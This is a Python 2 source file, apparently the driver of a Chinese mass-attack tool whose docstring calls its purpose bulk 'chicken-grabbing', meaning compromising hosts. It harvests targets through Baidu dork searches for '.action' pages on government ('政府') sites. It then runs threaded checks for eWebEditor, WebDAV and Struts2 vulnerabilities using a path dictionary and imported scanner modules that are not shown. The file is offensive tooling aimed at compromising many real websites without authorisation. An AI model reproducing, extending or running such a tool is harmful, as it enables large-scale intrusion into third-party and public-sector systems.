#!coding=utf-8

'''
@author:tzc-mask

@功能:批量抓鸡,oyea

'''
'''
1.百度抓取太慢了
2.struts2检测脚本再优化
'''

from multiprocessing import Process,Queue
from spider.baidu import baidu
#from spider.s_google import s_google
from threads.mask_thread import mask_thread
import time
from optparse import OptionParser
import threading

class mass_attack:
	def __init__(self):
		self.list_paths=open("./dicts/ewebeditor/asp1.txt").readlines()
		self.keyword=["inurl:.action"]           
		self.address=["政府"]           #百度爬虫配置
		self.run()

	def _inputs(self,queue):               #填充队列

		if self.target=="all":
		
			key_address=[i+" "+j for i in self.keyword for j in self.address]   #解析列表

			for i in key_address:
				t1=threading.Thread(target=baidu,args=(queue,i))            #百度抓取
				#t2=threading.Thread(target=s_google,args=(queue,i))        #google抓取
				t1.start()
				#t2.start()
				t1.join()
				#t2.join()
		else:
			print self.target
			queue.put(self.target)         #将单条添加到队列中

	def _outputs(self,queue):              #取出数据
		while 1:
			print u"队列长度:",queue.qsize()
			for i in range(5):                    #线程数量
				r2=mask_thread("mask",queue,self.list_paths,self.name)
				r2.start()
			for i in range(5):
				r2.join()

			time.sleep(2)


	def _get(self):

		usage_1=u"\n[*]python  mass_attack.py -n ewebeditor,webdav,struts2 -t http://www.xxx.com    针对单网站指定漏洞检测\n"
		usage_2=u"\n[*]python  mass_attack.py -n 1(ewebeditor)  针对批量网站进行单个漏洞检测\n"
		usage_3=u"[*]python  mass_attack.py -n all    针对批量网站进行所有漏洞检测\n\n"
		usage_4=u"@支持漏洞列表:\n"+"[1]ewebeditor\n[2]webdav\n[3]struts2\n\n"
		usage_5=u"@版本:1.0  2016.04.22   --by  nmask "

		self.option=OptionParser(usage=usage_1+usage_2+usage_3+usage_4+usage_5)
		self.option.add_option('-n','--name',help=u"漏洞名称(*必填*)")
		self.option.add_option('-t','--target',default=False,help=u"目标url,默认为自动抓取(*可选*)")
		self.options,arg=self.option.parse_args()

	def run(self):
		self._get()

		if self.options.target:
			self.target=self.options.target
		else:
			self.target="all"

		if self.options.name:                       #######解析参数###########
			self.name=self.options.name

			q=Queue()
			p1=Process(target=self._inputs,args=(q,))        #填充数据与取出数据同时进行，分别为2个进程
			p2=Process(target=self._outputs,args=(q,))
			p1.start()
			p2.start()
			p1.join()
			p2.join()

		else:
			self.option.print_help()

if __name__=="__main__":
	mass_attack()